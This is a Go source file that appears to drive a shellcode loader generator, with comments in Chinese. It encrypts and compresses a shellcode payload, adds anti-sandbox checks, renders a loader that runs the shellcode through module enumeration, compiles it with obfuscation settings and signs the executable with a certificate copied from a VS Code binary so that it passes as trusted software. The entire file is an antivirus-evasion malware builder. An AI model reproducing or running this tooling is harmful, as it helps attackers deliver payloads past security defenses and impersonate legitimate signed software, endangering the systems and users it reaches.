package main

import (
	"variant/build"
	"variant/compress"
	"variant/crypto"
	"variant/encoder"
	"variant/log"
	"variant/rand"
	"variant/render"
)

func main() {
	// 反沙箱模块
	sandbox := render.SandBox{
		Import: "variant/sandbox",
		Methods: []string{
			"sandbox.GetDesktopFiles",
			"sandbox.BootTimeGetTime",
		}}

	// 压缩算法模块
	compressor := render.Compressor{
		Import:    "variant/compress",
		Algorithm: "compress.LzwDecompress",
		Ratio:     8,
	}

	// 设置加密参数
	params := encoder.Payload{
		PlainText: "output/calc.bin",
		FileName:  rand.RStrings(),
		Path:      "output",
		Key:       rand.LByteStrings(32),
		IV:        rand.LByteStrings(32),
	}
	// 读取shellcode，返回加密之后的 strings
	payload, err := params.SetKeyIV(crypto.XorAesHexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
	if err != nil {
		log.Fatal(err)
	}

	// 压缩算法
	payload, _ = compress.LzwCompress([]byte(payload), 8)

	// 本地加载需要的数据
	local := render.Local{
		Payload:      payload,
		KeyName:      rand.RStrings(),
		KeyValue:     string(params.Key),
		IvName:       rand.RStrings(),
		IvValue:      string(params.IV),
		MainLocal:    rand.RStrings(),
		DecryptLocal: "crypto.XorAesHexBase85Decrypt",
	}

	load := render.Loader{
		Import: "variant/loader",
		Method: "loader.EnumerateLoadedModulesLoad",
	}

	// 定义模板渲染数据
	data := render.TmplData{
		CipherText: rand.RStrings(),
		PlainText:  rand.RStrings(),
		Loader:     load,
		Local:      local,
		SandBox:    sandbox,
		Compressor: compressor,
		//Args:          args,
	}

	// 设置模板的渲染参数
	tOpts := render.TmplOpts{
		TmplFile:     "render/templates/v6/Base.tmpl",
		OutputDir:    "output",
		OutputGoName: build.RandomGoFile(),
		Data:         data,
	}
	// 生成模板
	err = tOpts.TmplRender()
	if err != nil {
		log.Fatal(err)
	}

	// 编译参数
	cOpts := build.CompileOpts{
		GoFileName:  tOpts.OutputGoName,
		ExeFileName: build.RenameGoTrimSuffix(tOpts.OutputGoName),
		HideConsole: false,
		CompilePath: "output",
		BuildMode:   "pie",
		Literals:    true,
		GSeed:       true,
		Tiny:        true,
		GDebug:      false,
	}

	// 编译
	if err = cOpts.GoCompile(); err != nil {
		log.Fatal(err)
	}

	// 添加图标和文件信息
	//winres := gores.GoWinRes{
	//	CompilePath: "output",          // 指定编译目录
	//	ExtractFile: "Code.exe",        // 指定提取资源文件的对象
	//	ExtractDir:  "",                // 指定提取资源文件后输出的路径
	//	PatchFile:   cOpts.ExeFileName, // 指定使用 Patch 添加资源文件的对象
	//}

	// 提取 vscode 所有的资源文件
	//err = winres.Extract()
	//if err != nil {
	//	log.Fatal(err)
	//}

	// 使用 Patch 添加资源文件到编译后的程序
	//err = winres.HandleWinRes()
	//if err != nil {
	//	log.Fatal(err)
	//}

	// 伪造证书配置
	ct := build.CertThief{
		SignDir:  "output",
		SrcFile:  cOpts.ExeFileName,
		DstFile:  "Code.exe",
		SignedPE: build.RenameSignedPEName(cOpts.ExeFileName),
		CertFile: "Code.der",
	}

	// 保存证书
	//err = ct.SaveCertificate()
	//if err != nil {
	//	log.Fatal(err)
	//}

	// 利用EXE进行签名伪造
	//err = ct.SignExecutable()
	//if err != nil {
	//	log.Fatal(err)
	//}

	// 利用证书进行签名伪造
	err = ct.SignWithStolenCert()
	if err != nil {
		log.Fatal(err)
	}

	// 压缩参数
	//upx := build.UpxOpts{
	//	Level:   "--lzma",
	//	Keep:    true,
	//	Force:   true,
	//	SrcExe:  ct.Signed,
	//	SrcPath: "output",
	//	UpxPath: "build",
	//}

	// 执行压缩
	//err = upx.UpxPacker()
	//if err != nil {
	//	log.Fatal(err)
	//}
}
